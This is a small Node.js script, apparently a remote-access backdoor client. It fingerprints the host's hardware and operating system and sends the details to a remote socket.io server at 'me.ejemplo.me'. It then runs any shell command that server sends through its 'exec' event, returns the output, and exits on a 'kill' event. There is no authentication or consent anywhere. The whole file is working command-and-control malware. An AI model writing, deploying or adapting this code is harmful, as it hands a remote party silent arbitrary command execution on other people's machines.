const io = require('socket.io-client')
const si = require('systeminformation')
const { exec } = require('child_process')
const server = 'http://me.ejemplo.me'

const xd = async function () {
  const cpu = await si.cpu()
  const disk = (await si.diskLayout())[0]
  const os = await si.osInfo()
  const versions = await si.versions()
  const ram = await si.mem()
  const socket = io(server, {
    query: {
      manufacturer: cpu.manufacturer,
      brand: cpu.brand,
      speed: cpu.speed,
      cores: cpu.cores,
      pCores: cpu.physicalCores,
      totalRam: Math.round(ram.total / 1024 / 1024 / 1024),
      diskSize: Math.round(disk.size / 1024 / 1024 / 1024),
      diskVendor: disk.vendor,
      diskName: disk.name,
      diskType: disk.type,
      diskInterfaceType: disk.interfaceType,
      distro: os.distro,
      codeName: os.codename,
      platform: os.platform,
      kernel: os.kernel,
      arch: os.arch,
      node: versions.node
    }
  })
  socket.on('connect', function () {
    console.log('Connected')
  })
  socket.on('disconnect', function () {
    console.log('Disconnected')
  })
  socket.on('kill', function () {
    process.exit()
  })
  socket.on('exec', function (command, cb) {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        cb(error.message)
        return
      }
      if (stderr) {
        cb(stderr)
        return
      }
      cb(stdout)
    })
  })
}
xd()
